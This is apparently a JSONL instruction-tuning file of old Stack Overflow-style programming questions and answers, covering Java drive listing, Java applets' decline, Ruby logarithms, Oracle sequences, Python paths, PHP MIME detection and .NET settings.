{"instruction": "For a project I'm working on. I need to look for an executable on the filesystem. For UNIX derivatives, I assume the user has the file in the mighty $PATH variable, but there is no such thing on Windows.\nI can safely assume the file is at most 2 levels deep into the filesystem, but I don't know on what drive it will be. I have to try all drives, but I can't figure out how to list all available drives (which have a letter assigned to it).\nAny help?\nEDIT: I know there is a %PATH% variable, but it is not as integrated as in UNIX systems. For instance, the application I'm looking for is OpenOffice. Such software would not be in %PATH%, typically.", "output": "http://docs.oracle.com/javase/7/docs/api/java/io/File.html#listRoots()\nFile[] roots = File.listRoots();\nfor(int i = 0; i < roots.length ; i++)\n    System.out.println(\"Root[\"+i+\"]:\" + roots[i]);\n\ngoogle: list drives java, first hit:-)"}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "I think nowadays developers are kind of \"dropping out of the demo scene\". In the good old days demos were all about \"what could you technically squeeze out of the machine\". You needed to be a good developer/coder/hacker to achieve the best. Today the development seems to be more like basic technical stuff. Most effects are already provided by the graphics adapter. It's not so much about the code, so as a coder \"you can't show off\". It's more about design, graphics, more design, music and even more design. That's in most cases not the developers' domain :)\nHowever my guess would be that most good and experienced developers today have an history in demo scene, even if it's just a small one (just being interested and astonished).\nWow... PC-GPE still exists? :D"}
{"instruction": "I'm playing with the routing.rb code in Rails 2.1, and trying to to get it to the point where I can do something useful with the RoutingError exception that is thrown when it can't find the appropriate path.\nThis is a somewhat tricky problem, because there are some class of URLs which are just plain BAD: the /azenv.php bot attacks, the people typing /bar/foo/baz into the URL, etc... we don't want that.\nThen there's subtle routing problems, where we do want to be notified:  /artists/ for example, or ///.  In these situations, we may want an error being thrown, or not... or we get Google sending us URLs which used to be valid but are no longer because people deleted them.\nIn each of these situations, I want a way to contain, analyze and filter the path that we get back, or at least some Railsy way to manage routing past the normal 'fallback catchall' url.  Does this exist?\nEDIT:\nSo the code here is: \n# File vendor/rails/actionpack/lib/action_controller/rescue.rb, line 141\n\ndef rescue_action_without_handler(exception)\n log_error(exception) if logger\n erase_results if performed?\n\n # Let the exception alter the response if it wants.\n # For example, MethodNotAllowed sets the Allow header.\n if exception.respond_to?(:handle_response!)\n   exception.handle_response!(response)\n end\n\n if consider_all_requests_local || local_request?\n   rescue_action_locally(exception)\n else\n  rescue_action_in_public(exception)\n end\nend\n\nSo our best option is to override log_error(exception) so that we can filter down the exceptions according to the exception.  So in ApplicationController\ndef log_error(exception)\n    message = '...'\n    if should_log_exception_as_debug?(exception)\n      logger.debug(message)\n    else\n      logger.error(message)\n    end\nend\n\ndef should_log_exception_as_debug?(exception)\n   return (ActionController::RoutingError === exception)\nend\n\nSalt for additional logic where we want different controller logic, routes, etc.", "output": "There's the method_missing method. You could implement that in your Application Controller and catch all missing actions, maybe logging those and redirecting to the index action of the relevant controller. This approach would ignore everything that can't be routed to a controller, which is pretty close to what you want. \nAlternatively, I'd just log all errors, extract the URL and sort it by # of times it occured."}
{"instruction": "The Sun Documentation for DataInput.skipBytes states that it \"makes an attempt to skip over n bytes of data from the input stream, discarding the skipped bytes. However, it may skip over some smaller number of bytes, possibly zero. This may result from any of a number of conditions; reaching end of file before n bytes have been skipped is only one possibility.\"\n\nOther than reaching end of file, why might skipBytes() not skip the right number of bytes? (The DataInputStream I am using will either be wrapping a FileInputStream or a PipedInputStream.)\nIf I definitely want to skip n bytes and throw an EOFException if this causes me to go to the end of the file, should I use readFully() and ignore the resulting byte array? Or is there a better way?", "output": "1) There might not be that much data available to read (the other end of the pipe might not have sent that much data yet), and the implementing class might be non-blocking (i.e. it will just return what it can, rather than waiting for enough data to fulfil the request).\nI don't know if any implementations actually behave in this way, however, but the interface is designed to permit it.\nAnother option is simply that the file gets closed part-way through the read.\n2) Either readFully() (which will always wait for enough input or else fail) or call skipBytes() in a loop.  I think the former is probably better, unless the array is truly vast."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I wonder how widespread the JVM actually is? In the case of Flash, IE5 preinstalled it, giving it a large automatic user base. But unless the JVM was included with the OS install, users wouldn't have it. I suppose as a developer you target the largest install base, meaning choosing Flash over Java.\nThere are Java applets here and there; definitely not widespread though."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "i believe it's their ugliness that kept them away from the modern web. flash brought the design, javascript brought a convenient way to make some cool things on a client. being a box inside a browser (just like a flash, though, but much uglier) applet technology was put away.\nactually, the only thing that might be missed is the possibility to have a 'client-server' type of communication inside the web, because java applet could have a stateful connection. on the other hand, you would have to put some server on the other side and open a port for it, which just was too much house-work for shared hosting environments.\napplets still live in some different areas, like control centers for roads, tunnels, power plants and stuff like that."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "People still use applets. But you are right, there are tons of different solutions out there. For example, take a look at javafx"}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I think compatibility issues were a big problem.  Most notably with IE and Microsoft's Java VM which wasn't as standards compliant as it might have been.\nEven with the Sun JVM you could have problems.  I've had fun where I've had two 3rd-party Applets requiring different versions of Java which causes all sorts of problems.  Sun have tried to solve this problem by replacing Applets with Java Web Start which gives you a link in the browser that launches the application in it's own window instead of inside the browser.  (In theory with JWS you can have different applications using different VMs but it never seems to work for me as well as it should.)\nAdvancements with JavaScript have also made it possible to developer much richer web pages so a lot of things in the past that you could only do in Applets can now be done simply with AJAX."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I see them a lot in acedemic settings (hosted on department or faculty sites), but you're right in that they are not very popular.\nHowever, remember that Java's big promise has been achieved. We have Flash, Java Applets, Silverlight, and ever-improving JavaScript frameworks.\nNow if I made add a personal opinion - I think that Java applets are inelegant. They tend to look ugly, the Java runtime makes its presence in the OS far too known (in terms of runtime visuals, updates, and the ugly installer). Flash is much better with its rich media environment and its transparent (and ubiquitous) deployment."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I think Java applets were overshadowed by Flash and ActionScript (pun unintended), being much easier to use for what Java Applets were being used at the time (animations + stateful applications). \nFlash's success in this respect in turn owes to its much smaller file sizes, as well as benefiting from the Sun vs. Microsoft suit that resulted in Microsoft removing the MSJVM from Internet Explorer, at a time of Netscape's demise and IE's heavy dominance."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "By the time Java's GUI API stopped totally sucking, everyone was using Flash. And even today, Java is no where near as good as Flash at doing fancy graphics."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "The JVM is very widespread, especially in the coorporate world, at least where I've worked, there was always a JVM installed.\nI'm currently working on a Java Applet, but in general, I would never an applet unless I had to. But then again, I wouldn't use Flash or Silverlight, either. Applets have a slow load time, and look out of place in webpages. Also, Macromedia/Adobe have outmarketed the good ol' applets."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I assume it's because java is a \"real\", ie. general purpose language. To make an applet, you have to write code, and there aren't any shortcuts.\nNow that flash etc have come along, you can pretty much just drap and drop your way through making a cool animation for your website. This is a much lower barrier for entry - you don't have to know how to program in order to get a flash animation working. So flash proliferates, and java applets are hardly used anymore."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "I think applets are collateral damage in the battle between Microsoft and Sun.\nAt first, the JVM was very slow to load and demanded too much memory.\nThen, when increase in computing power made the JVM possible, Sun played hard as it attempted to control all things Java:\n\nAs part of another private antitrust lawsuit filed against Microsoft by Sun in March, Sun sought a preliminary injunction requiring Microsoft to include a current Java virtual machine (JVM) in the Windows XP operating system. Microsoft said the decision to include the JVM this week is a direct result of the latest legal entanglement with Sun, but Microsoft plans to disband support for Java in Windows following Jan. 1, 2004. Microsoft Reverses Course, Will Include Java VM In Windows XP--For Now"}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "1) AWT made for horrid UIs. Swing improved on that but it was too late, because...\n2) Microsoft dropped support for Java in the browser (its propietary MSJVM), and before it did, it would only support the last version it released, which was roughly JDK 1.1 compatible.\n3) So today you cannot be sure that an applet will run on the majority of non-developer machines, unlike flash.   \nSame can be said of ActiveX by the way."}
{"instruction": "I want to get the base 10 logarithm of a Fixnum using Ruby, but found that n.log or n.log10 are not defined. Math::log is defined but uses a different base than 10.\nWhat is the easiest way to get the base 10 logarithm of a Fixnum?", "output": "Reading the documentation for module Math the answer is really obvious:\nMath::log10(n)\n\nThis gives the base 10 logarithm of n."}
{"instruction": "I want to get the base 10 logarithm of a Fixnum using Ruby, but found that n.log or n.log10 are not defined. Math::log is defined but uses a different base than 10.\nWhat is the easiest way to get the base 10 logarithm of a Fixnum?", "output": "Math.log10(numeric) => float\nreturns base 10 log"}
{"instruction": "I want to get the base 10 logarithm of a Fixnum using Ruby, but found that n.log or n.log10 are not defined. Math::log is defined but uses a different base than 10.\nWhat is the easiest way to get the base 10 logarithm of a Fixnum?", "output": "There is  \nMath::log10 (n)\n\nAnd there is also a property of logarithms that logx(y) = log(y)/log(x)"}
{"instruction": "I was looking out for a free plugin for developing/debugging JSP pages in eclipse.\nAny suggestions?", "output": "The former BEA Workshop is now Oracle Workshop. It is the best JSP editor with WYSIWYG support and it is free. It is not specific to WebLogic. Basic JSP editing is server neutral anyway. However, it supports launching and debugging on many servers.\nYou can read my blog post about it."}
{"instruction": "In PostgreSQL, I can do something like this:\nALTER SEQUENCE serial RESTART WITH 0;\n\nIs there an Oracle equivalent?", "output": "A true restart is not possible AFAIK. (Please correct me if I'm wrong!).\nHowever, if you want to set it to 0, you can just delete and recreate it.\nIf you want to set it to a specific value, you can set the INCREMENT to a negative value and get the next value.\nThat is, if your sequence is at 500, you can set it to 100 via\nALTER SEQUENCE serial INCREMENT BY -400;\nSELECT serial.NEXTVAL FROM foo;\nALTER SEQUENCE serial INCREMENT BY 1;"}
{"instruction": "G'day,\nI was thinking about a comment from Kristopher Johnson about my answer to this question regarding Software Development Quality.\nI'd posted a list of software quality metrics that I could think of off the top of my head that included:\n\nMcCabe Cyclometric Complexity - basically a measure of the number of linear paths through code.\nLevels of indentation - a measure of complexity when looking at nested decision statements.\nDistance from declaration to first use - how many statements exist between where a variable is declared and where it is first used.\nComment percentage - how many lines of code are comments compared to source code.\nPercent test coverage - as a percentage of lines of code, how many are exercised by your suite of tests.\nPath test coverage - how many paths of execution are exercised by your tests.\nUnit coverage - how many individual units, classes, packages, etc., are exercised by your unit tests.\n\nKris's comment was:\n\nOnly the test-coverage metrics listed here could be considered a measure of \"quality.\" The others are measurements of complexity and readability, which really has nothing to do with quality.\n\nApart from the fact that I don't agree with this statement at all, it got me thinking.\nWhen I have to review code that has hardly any associated tests, whether unit, system or integration, I tend to approach the code much, much more warily than if I see a good suite of tests that have been successfully passed.\nSame thing when performing security audits on code. If I see unused variables, huge functions, bizarre mixtures of configs, per server, per dir, etc. being used in Apache modules it also predisposes me to approach the code very warily.\nDoes anyone else use this initial \"gut feeling\" approach and does it affect the outcome?\nBTW I don't agree with Kris's comment because all the other metrics are definitely valid measures that will help highlight badly designed, poorly executed code. As Damian Conway says:\n\nAlways code as if the guy who ends up maintaining your code will be a violent psychopath who knows where you live.", "output": "I think you and Kris just disagree on the definition of quality. Take the analogy of a proof in Mathematics. \nYou could argue that quality is just down to whether the proof is correct, that is it correctly goes from assumptions to result. However, most mathematicians would agree that some proofs are better than others because they are shorter, or more cleverly done, or easier to understand, and these are measures of quality. Only the first definition is formally definable, but most Mathematicians I think would mean the second if they said \"a better proof\". \nWhat Kris says is true under the first definition, only tests really measure correctness, but I think most programmers, including me, would associate quality with your measures as well."}
{"instruction": "G'day,\nI was thinking about a comment from Kristopher Johnson about my answer to this question regarding Software Development Quality.\nI'd posted a list of software quality metrics that I could think of off the top of my head that included:\n\nMcCabe Cyclometric Complexity - basically a measure of the number of linear paths through code.\nLevels of indentation - a measure of complexity when looking at nested decision statements.\nDistance from declaration to first use - how many statements exist between where a variable is declared and where it is first used.\nComment percentage - how many lines of code are comments compared to source code.\nPercent test coverage - as a percentage of lines of code, how many are exercised by your suite of tests.\nPath test coverage - how many paths of execution are exercised by your tests.\nUnit coverage - how many individual units, classes, packages, etc., are exercised by your unit tests.\n\nKris's comment was:\n\nOnly the test-coverage metrics listed here could be considered a measure of \"quality.\" The others are measurements of complexity and readability, which really has nothing to do with quality.\n\nApart from the fact that I don't agree with this statement at all, it got me thinking.\nWhen I have to review code that has hardly any associated tests, whether unit, system or integration, I tend to approach the code much, much more warily than if I see a good suite of tests that have been successfully passed.\nSame thing when performing security audits on code. If I see unused variables, huge functions, bizarre mixtures of configs, per server, per dir, etc. being used in Apache modules it also predisposes me to approach the code very warily.\nDoes anyone else use this initial \"gut feeling\" approach and does it affect the outcome?\nBTW I don't agree with Kris's comment because all the other metrics are definitely valid measures that will help highlight badly designed, poorly executed code. As Damian Conway says:\n\nAlways code as if the guy who ends up maintaining your code will be a violent psychopath who knows where you live.", "output": "Developed \"gut feeling\" is what distinguish beginners from professionals. After you gain some experience \"gut feeling\" becomes one of the main contributors to final decision. It doesn't matter whether you're reviewing somebody's code or creating system architecture, gut feeling guides you. However pragmatic developer must not be too self-assured. There is always a place for check-lists and other means.\nAs for metrics, I totally agree with you. Metrics is meaningless if it doesn't contribute to code quality."}
{"instruction": "Given a path such as \"mydir/myfile.txt\", how do I find the absolute filepath relative to the current working directory in Python? E.g. on Windows, I might end up with:\n\"C:/example/cwd/mydir/myfile.txt\"", "output": ">>> import os\n>>> os.path.abspath(\"mydir/myfile.txt\")"}
{"instruction": "Given a path such as \"mydir/myfile.txt\", how do I find the absolute filepath relative to the current working directory in Python? E.g. on Windows, I might end up with:\n\"C:/example/cwd/mydir/myfile.txt\"", "output": ">>> import os\n>>> os.path.abspath('mydir/myfile.txt')\n'C:\\\\example\\\\cwd\\\\mydir\\\\myfile.txt'\n>>>"}
{"instruction": "I am currently in the process of restructuring my local Subversion repository by adding some new projects and merging legacy code and data from a couple of older repositories into it. \nWhen I have done this in the past I have usually put the legacy code in a dedicated \"legacy\" folder, as not to \"disturb\" the new and \"well-structured\" code tree. However, in the spirit of refactoring I feel this is somewhat wrong. In theory, the legacy code will be refactored over time and moved to its new location, but in practice this rarely happens.\nHow do you treat your legacy code? As much as I feel tempted to tuck away old sins in the \"legacy\" folder, never to look at it again, on some level I hope that by forcing it to live among the more \"healthy\" inhabitants in the repository, maybe the legacy code will have a better chance of getting well some day?\n(Yeah, we all know we shouldn't rewrite stuff, but this is my \"fun\" repository, not my business projects...)\nUpdate\nI am not worried about the technical aspects of keeping track of various versions. I know how to use tags and branches for that. This is more of a psychological aspect, as I prefer to have a \"neat\" structure in the repository, which makes navigating it much easier\u2014for humans.", "output": "Tagging is a very cheap operation in subversion. Tag your code when you start refactoring and at regular stages while you go along. That way it's easy to still access the old (but functional code) as a reference for your shiny new (but broken code). :-)"}
{"instruction": "I am currently in the process of restructuring my local Subversion repository by adding some new projects and merging legacy code and data from a couple of older repositories into it. \nWhen I have done this in the past I have usually put the legacy code in a dedicated \"legacy\" folder, as not to \"disturb\" the new and \"well-structured\" code tree. However, in the spirit of refactoring I feel this is somewhat wrong. In theory, the legacy code will be refactored over time and moved to its new location, but in practice this rarely happens.\nHow do you treat your legacy code? As much as I feel tempted to tuck away old sins in the \"legacy\" folder, never to look at it again, on some level I hope that by forcing it to live among the more \"healthy\" inhabitants in the repository, maybe the legacy code will have a better chance of getting well some day?\n(Yeah, we all know we shouldn't rewrite stuff, but this is my \"fun\" repository, not my business projects...)\nUpdate\nI am not worried about the technical aspects of keeping track of various versions. I know how to use tags and branches for that. This is more of a psychological aspect, as I prefer to have a \"neat\" structure in the repository, which makes navigating it much easier\u2014for humans.", "output": "All code becomes 'legacy' one day, why seperate it at all? Source control is by project/branch or project/platform/branch and that type of hierarchy. Who cares how long in the tooth it is?"}
{"instruction": "I am trying to find a way to determine at run-time how much memory a given class is using in .NET.  Using Marshal.SizeOf() is out, as it only works on value types.  Is there a way to check exactly how much memory a class uses?", "output": "I've only recently started looking into this type of thing, but i have found that memory profilers can give quite detailed information regarding instances of objects within your application.\nHere are a couple that are worth trying:\n\nANTS Profiler\n.NET Memory Profiler"}
{"instruction": "mime_content_type() is deprecated.\nHow can I find the MIME type of a local file using PHP5 but without using this deprecated method or the PECL fileinfo extension?\nEdit: That's what I was afraid of.  It's unfortunate that they deprecated a built-in function in favour of one that requires an extension that isn't always available.", "output": "The getID3() library is a quick and easy works-most-of-the-time option. Originally named for a project to obtain MP3 ID3 data, the library does two hecks of a lot more than that and is quite convenient for all sorts of common or odd file meta data tasks.\nI've used it to get the MIME types of files for online image and video tools. In all the testing I've done I've not seen getID3 get the MIME type wrong.\nI've also used it to check if QuickTime videos have streaming hints. I mention  this as an example of versatility.\nA second more time consuming option is to roll your own MIME type checker as already suggested. If you have a MIME magic file you can go a little further than a lookup on the file extension by comparing the first n bytes of file data against a first-n-bytes to MIME type lookup table derived from your MIME magic file.\nA typical MIME magic file will contain in excess of 500 sets of MIME types which might result in slow comparisons (lots of checks to make). Hard-coding the 10 most common MIME type checks in your home rolled solution will help there."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "Awesome!  I was truly expecting this question to remain unanswered.  I will relate with Tony in that I got my start in the scene back in the late 80's/early 90's when calling around BBS's on my Atari 8-bit.  It's amazing what people can do with assembly and serious know-how on a 1.79MHz 8-bit machine.  I got hooked up with some local sceners who were also into the PC scene.\nOne of the most influential people I've met was White Shadow / Renaissance.  I met him right at the time he released DoWackaDo, which was a production that astounded me.  It ran full framerate on his 286 12MHz with MOD music, animation, and hardware tricks to extract more colors than normally possible.  Unfortunately, those hardware tricks keep it from being recorded to video, so I can't find it online.  Though, it is on the Mind Candy Vol 1 DVD.\nWill anyone here be planning to visit Block Party in 2009?\nBlaM: I have to agree with you to a point.  Nothing is basic.  Compare the latest party winning demos with those of around 1993.  Second Reality was hailed as one of the demoscene's greatest productions, but now it looks like poo compared to Debris.  Phong shaders and polygon intersection are child's play compared to now.  Moreover, it's all about design, but unfortunately demos that focus primarily on that are not as exciting to most coders."}
{"instruction": "I am currently in the process of restructuring my local Subversion repository by adding some new projects and merging legacy code and data from a couple of older repositories into it. \nWhen I have done this in the past I have usually put the legacy code in a dedicated \"legacy\" folder, as not to \"disturb\" the new and \"well-structured\" code tree. However, in the spirit of refactoring I feel this is somewhat wrong. In theory, the legacy code will be refactored over time and moved to its new location, but in practice this rarely happens.\nHow do you treat your legacy code? As much as I feel tempted to tuck away old sins in the \"legacy\" folder, never to look at it again, on some level I hope that by forcing it to live among the more \"healthy\" inhabitants in the repository, maybe the legacy code will have a better chance of getting well some day?\n(Yeah, we all know we shouldn't rewrite stuff, but this is my \"fun\" repository, not my business projects...)\nUpdate\nI am not worried about the technical aspects of keeping track of various versions. I know how to use tags and branches for that. This is more of a psychological aspect, as I prefer to have a \"neat\" structure in the repository, which makes navigating it much easier\u2014for humans.", "output": "Use Externals Definitions (svn:externals property)  to reference your legacy code as you would a third-party repository. \nThen you can separate your refactoring work from your dependent projects and (using fixed revision references i.e. -r1234) be very explicit about which revision of the legacy code the dependent project depends on."}
{"instruction": "G'day,\nI was thinking about a comment from Kristopher Johnson about my answer to this question regarding Software Development Quality.\nI'd posted a list of software quality metrics that I could think of off the top of my head that included:\n\nMcCabe Cyclometric Complexity - basically a measure of the number of linear paths through code.\nLevels of indentation - a measure of complexity when looking at nested decision statements.\nDistance from declaration to first use - how many statements exist between where a variable is declared and where it is first used.\nComment percentage - how many lines of code are comments compared to source code.\nPercent test coverage - as a percentage of lines of code, how many are exercised by your suite of tests.\nPath test coverage - how many paths of execution are exercised by your tests.\nUnit coverage - how many individual units, classes, packages, etc., are exercised by your unit tests.\n\nKris's comment was:\n\nOnly the test-coverage metrics listed here could be considered a measure of \"quality.\" The others are measurements of complexity and readability, which really has nothing to do with quality.\n\nApart from the fact that I don't agree with this statement at all, it got me thinking.\nWhen I have to review code that has hardly any associated tests, whether unit, system or integration, I tend to approach the code much, much more warily than if I see a good suite of tests that have been successfully passed.\nSame thing when performing security audits on code. If I see unused variables, huge functions, bizarre mixtures of configs, per server, per dir, etc. being used in Apache modules it also predisposes me to approach the code very warily.\nDoes anyone else use this initial \"gut feeling\" approach and does it affect the outcome?\nBTW I don't agree with Kris's comment because all the other metrics are definitely valid measures that will help highlight badly designed, poorly executed code. As Damian Conway says:\n\nAlways code as if the guy who ends up maintaining your code will be a violent psychopath who knows where you live.", "output": "Yes, the \"gut feeeling\" is a very good tool as soon as you have a little experience. I seem to remember that Hunt and Thomas mention this in the Pragmatic Programmer. They say something like \"you've got plenty of experience, so don't ignore that nagging feeling\" (if you have the right quote, or if it's from another book, please correct me).\nCarl"}
{"instruction": "The Sun Documentation for DataInput.skipBytes states that it \"makes an attempt to skip over n bytes of data from the input stream, discarding the skipped bytes. However, it may skip over some smaller number of bytes, possibly zero. This may result from any of a number of conditions; reaching end of file before n bytes have been skipped is only one possibility.\"\n\nOther than reaching end of file, why might skipBytes() not skip the right number of bytes? (The DataInputStream I am using will either be wrapping a FileInputStream or a PipedInputStream.)\nIf I definitely want to skip n bytes and throw an EOFException if this causes me to go to the end of the file, should I use readFully() and ignore the resulting byte array? Or is there a better way?", "output": "Josh Bloch has publicised this recently. It is consistent in that InputStream.read is not guaranteed to read as many bytes as it could. However, it is utterly pointless as an API method. InputStream should probably also have readFully."}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "Depends on what you want for performance. \nThe case statement is ugly but does not consume memory that would need to be allocated.\nHowever, you could create a class for your fields and load instances of them into a Dictionary. Perform this operation in the global.asp script so it only happens once. Store the dictionary in the global asp collection such that it is only allocated once but used with each page call.\nMy appologies for not getting too specific here... it's been a while."}
{"instruction": "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.", "output": "Be aware that Microsoft do not recommend that you static link the runtime into your project, as this prevents it from being serviced by windows update to fix critical security bugs. There are also potential problems if you are passing memory between your main .exe and .dll files as if each of these static links the runtime you can end up with malloc/free mismatch problems.\nYou can include the DLLs with the executable, without compiling them into the .exe and without running the redist tool - this is what I do and it seems to work fine. \nThe only fly in the ointment is that you need to include the files twice if you're distributing for a wide range of Windows versions - newer OSs need the files in manifest-defined directories, and older ones want all the files in the program directory."}
{"instruction": "What tools are available for metamodelling? \nEspecially for developing diagram editors, at the moment trying out Eclipse GMF\nWondering what other options are out there? \nAny comparison available?", "output": "Although generally a UML tool, I would look at StarUML. It supports additional modules beyond what are already built in. If it doesn't have what you need built in or as a module, I supposed you could make your own, but I don't know how difficult that is."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "My friends and I watched tons of them in college; watching Second Reality just after it was released was amazing.  These days, I pop around online and watch a few once or twice a year.  It just doesn't seem the same when you have high end 3D graphics cards and parallel processors...\nBTW, I do have a Gravis Ultrasound Max sitting in my closet.  Anyone want it?\nProud owner of Mind Candy Vol 1 as well!"}
{"instruction": "I am using .Net 2 and the normal way to store my settings. I store my custom object serialized to xml. I am trying to retrieve the default value of the property (but without reseting other properties). I use:\nValuationInput valuationInput = (ValuationInput) Settings.Default.Properties[\"ValuationInput\"].DefaultValue;\n\nBut it seems to return a string instead of ValuationInput and it throws an exception. \nI made a quick hack, which works fine:\nstring valuationInputStr = (string) \nSettings.Default.Properties[\"ValuationInput\"].DefaultValue;\n            XmlSerializer xmlSerializer = new XmlSerializer(typeof(ValuationInput));\n            ValuationInput valuationInput = (ValuationInput) xmlSerializer.Deserialize(new StringReader(valuationInputStr));\n\nBut this is really ugly - when I use all the tool to define a strongly typed setting, I don't want to serialize the default value myself, I would like to read it the same way as I read the current value: ValuationInput valuationInput = Settings.Default.ValuationInput;", "output": "At some point, something, somewhere is going to have to use Xml Deserialization, whether it is you or a wrapper inside the settings class. You could always abstract it away in a method to remove the \"ugly\" code from your business logic.\npublic static T FromXml<T>(string xml)\n{\n    XmlSerializer xmlser = new XmlSerializer(typeof(T));\n    using (System.IO.StringReader sr = new System.IO.StringReader(xml))\n    {\n        return (T)xmlser.Deserialize(sr);\n    }\n}\n\nhttp://www.vonsharp.net/PutDownTheXmlNodeAndStepAwayFromTheStringBuilder.aspx"}
{"instruction": "I am using .Net 2 and the normal way to store my settings. I store my custom object serialized to xml. I am trying to retrieve the default value of the property (but without reseting other properties). I use:\nValuationInput valuationInput = (ValuationInput) Settings.Default.Properties[\"ValuationInput\"].DefaultValue;\n\nBut it seems to return a string instead of ValuationInput and it throws an exception. \nI made a quick hack, which works fine:\nstring valuationInputStr = (string) \nSettings.Default.Properties[\"ValuationInput\"].DefaultValue;\n            XmlSerializer xmlSerializer = new XmlSerializer(typeof(ValuationInput));\n            ValuationInput valuationInput = (ValuationInput) xmlSerializer.Deserialize(new StringReader(valuationInputStr));\n\nBut this is really ugly - when I use all the tool to define a strongly typed setting, I don't want to serialize the default value myself, I would like to read it the same way as I read the current value: ValuationInput valuationInput = Settings.Default.ValuationInput;", "output": "@Grzenio,\nWhy don't you use your object type directly? You can set type of your setting on Project Properties->Settings tab. You can select your type by clicking on Browse in drop down for Type column.\nCitation from MSDN:  \n\nApplication settings can be stored as\n  any data type that is XML serializable\n  or has a TypeConverter that implements\n  ToString/FromString\n\nThat way you can have strongly typed settings, i.e. (ValuationInput) Settings.Default.Properties[\"ValuationInput\"].DefaultValue; will return an object instead of string."}
{"instruction": "The Sun Documentation for DataInput.skipBytes states that it \"makes an attempt to skip over n bytes of data from the input stream, discarding the skipped bytes. However, it may skip over some smaller number of bytes, possibly zero. This may result from any of a number of conditions; reaching end of file before n bytes have been skipped is only one possibility.\"\n\nOther than reaching end of file, why might skipBytes() not skip the right number of bytes? (The DataInputStream I am using will either be wrapping a FileInputStream or a PipedInputStream.)\nIf I definitely want to skip n bytes and throw an EOFException if this causes me to go to the end of the file, should I use readFully() and ignore the resulting byte array? Or is there a better way?", "output": "It turns out that readFully() adds more performance overhead than I was willing to put up with.\nIn the end I compromised: I call skipBytes() once, and if that returns fewer than the right number of bytes, I call readFully() for the remaining bytes."}
